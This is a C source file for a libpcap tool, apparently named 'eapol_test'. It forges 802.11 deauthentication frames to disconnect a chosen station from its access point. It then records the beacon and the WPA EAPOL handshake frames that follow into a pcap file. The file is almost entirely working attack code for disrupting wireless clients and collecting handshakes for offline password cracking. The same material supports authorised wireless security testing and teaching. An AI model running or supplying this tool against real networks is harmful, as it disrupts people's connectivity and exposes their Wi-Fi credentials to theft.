#include "deauth.h"
#include "eapol.h"


void usage(){
    printf("syntax : eapol_test <interface> <ap mac> <station mac> <pwd and file name>\n");
    printf("sample 1 : eapol_test wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB /home/User/Desktop/eapol_test.pcap\n");
}

void packet_handler (u_char * dumpfile, const struct pcap_pkthdr* header, const u_char * pkt_data)
{
    pcap_dump (dumpfile, header, pkt_data);
}

void pcap_dump(u_char * dumpfile, const struct pcap_pkthdr* header, const u_char * pkt_data);

int main(int argc, char* argv[])
{
    if (argc != 5) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    DeauthPacket packet_1; // ap -> station
    DeauthPacket packet_2; // station -> ap

    packet_1.radio.it_version = version;
    packet_1.radio.it_pad = padding;
    packet_1.radio.it_len = radio_len;
    packet_1.radio.it_present = flags;
    packet_1.dea.type = Type;
    packet_1.dea.dur = padding;
    packet_1.dea.d_addr = Mac(argv[3]);
    packet_1.dea.s_addr = Mac(argv[2]);
    packet_1.dea.bssid = Mac(argv[2]);
    packet_1.dea.num = number;
    packet_1.wir.code = reason_code;
    ////////////////////////////////////////
    packet_2.radio.it_version = version;
    packet_2.radio.it_pad = padding;
    packet_2.radio.it_len = radio_len;
    packet_2.radio.it_present = flags;
    packet_2.dea.type = Type;
    packet_2.dea.dur = padding;
    packet_2.dea.d_addr = Mac(argv[2]);
    packet_2.dea.s_addr = Mac(argv[3]);
    packet_2.dea.bssid = Mac(argv[3]);
    packet_2.dea.num = number;
    packet_2.wir.code = reason_code;

    printf("start send deauth packet\n");


//    for(int i=0; i<15; i++){
//        int res1 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_1), sizeof(DeauthPacket));
//        int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_2), sizeof(DeauthPacket));
//        usleep(100000);
//        if(res1 != 0){
//            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
//        }
//        else if(res2 != 0){
//            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
//        }
//    }

    printf("finish deauth packet\n");
    printf("-----------------------------\n");


    struct radiotap_header* radio_h;
    struct beacon_header* beacon_h;
    //struct qos_data* qos;
    //struct logical_link* logical;
    //struct eapol_header* eapol;

    FILE* fp = fopen(argv[4], "wb");
    //FILE* fp2 = fopen(argv[4], "r+");
    pcap_dumper_t* dumpfile;

    Mac beacon_compare_s_addr;
    Mac beacon_compare_bssid;
    Mac compare_argv_bssid = Mac(argv[2]);
    Mac compare_argv_station = Mac(argv[3]);
    Mac eapol_compare_qos_s_addr;
    Mac eapol_compare_qos_bssid;
    Mac eapol_compare_qos_d_addr;

    dumpfile = pcap_dump_fopen(handle, fp);


    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet; //packet start point
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct radiotap_header* radio_h1;
        struct beacon_header* beacon_h;
        radio_h1 = (struct radiotap_header*)packet;
        beacon_h = (struct beacon_header*)(packet+radio_h1->it_len);

        beacon_compare_s_addr = Mac(beacon_h->beacon_s_addr);
        beacon_compare_bssid = Mac(beacon_h->beacon_bssid);

        if(beacon_h->beacon_type == beacon && compare_argv_bssid == beacon_compare_s_addr && compare_argv_bssid == beacon_compare_bssid){
            printf("beacon packet collect succes !! \n");
            //dumpfile = pcap_dump_fopen(handle, fp);
            //pcap_loop(handle, 1, packet_handler, (unsigned char *)dumpfile);
            pcap_dump((unsigned char *)dumpfile, header, packet);
            break;
        }
    }
    pcap_dump_close(dumpfile);
    pcap_close(handle);
    FILE* fp2 = fopen(argv[4], "ab+");
    dumpfile = pcap_dump_fopen(handle, fp2);
    int count = 0;

    char errbuf2[PCAP_ERRBUF_SIZE];
    pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf2);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf2);
        return -1;
    }

    for(int i=0; i<15; i++){
        int res1 = pcap_sendpacket(handle2, reinterpret_cast<const u_char*>(&packet_1), sizeof(DeauthPacket));
        int res2 = pcap_sendpacket(handle2, reinterpret_cast<const u_char*>(&packet_2), sizeof(DeauthPacket));
        usleep(1000);
        if(res1 != 0){
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res1, pcap_geterr(handle));
        }
        else if(res2 != 0){
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
        }
    }

    while(true) {
        struct pcap_pkthdr* header2;
        const u_char* packet2; //packet start point
        int res = pcap_next_ex(handle2, &header2, &packet2);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        struct radiotap_header* radio_eapol;
        struct qos_data* qos;
        struct logical_link* logical;
        struct eapol_header* eapol;

        radio_eapol = (struct radiotap_header*)packet2;
        qos = (struct qos_data*)(packet2+radio_eapol->it_len);
        logical = (struct logical_link*)(packet2+radio_eapol->it_len+sizeof(struct qos_data));
        eapol = (struct eapol_header*)(packet2+radio_eapol->it_len+sizeof(struct qos_data)+sizeof(struct logical_link));

        //printf("eapol start\n");

        eapol_compare_qos_bssid = Mac(qos->qos_bssid);
        eapol_compare_qos_s_addr = Mac(qos->qos_sourAddr);
        eapol_compare_qos_d_addr = Mac(qos->qos_desAddr);

//        if(qos->qosType == qos_check && eapol->eapol_type == eapol_check){
//            printf("eapol ver : %02x\n", eapol->eapol_version);
//            printf("eapol type : %02x\n",eapol->eapol_type);
//        }

        if(qos->qosType == qos_check && eapol->eapol_type == eapol_check && compare_argv_bssid == eapol_compare_qos_bssid && compare_argv_bssid == eapol_compare_qos_s_addr){
            pcap_dump((unsigned char *)dumpfile, header2, packet2);
            printf("eapol succes\n");
            count = count +1;
            printf("count : %d\n", count);
        }else if(qos->qosType == qos_check && eapol->eapol_type == eapol_check && compare_argv_station == eapol_compare_qos_bssid && compare_argv_station == eapol_compare_qos_d_addr){
            pcap_dump((unsigned char *)dumpfile, header2, packet2);
            printf("eapol succes2\n");
            count = count +1;
            printf("count : %d\n", count);
        }else if(count >= 3) break;

        ////        //        if(eapol->eapol_type == eapol_check && compare->eapol_compare_qos_bssid == compare->compare_argv_bssid
        ////        //           && compare->eapol_compare_qos_s_addr == compare->compare_argv_bssid){
        ////        //            dumpfile = pcap_dump_fopen(handle, fp2);
        ////        //            if(dumpfile == NULL){
        ////        //                printf("dump file open error ! ");
        ////        //            }
        ////        //            pcap_dump((unsigned char *)dumpfile, header, packet);
        ////        //        }
        ////        //        else if(eapol->eapol_type == eapol_check){
        ////        //            if(dumpfile == NULL){
        ////        //                printf("dump file open error ! ");
        ////        //            }
        ////        //            pcap_dump((unsigned char *)dumpfile, header, packet);
        ////        //        }
    }




    //    printf("\n\n");
    pcap_dump_close(dumpfile);

    pcap_close(handle2);
}

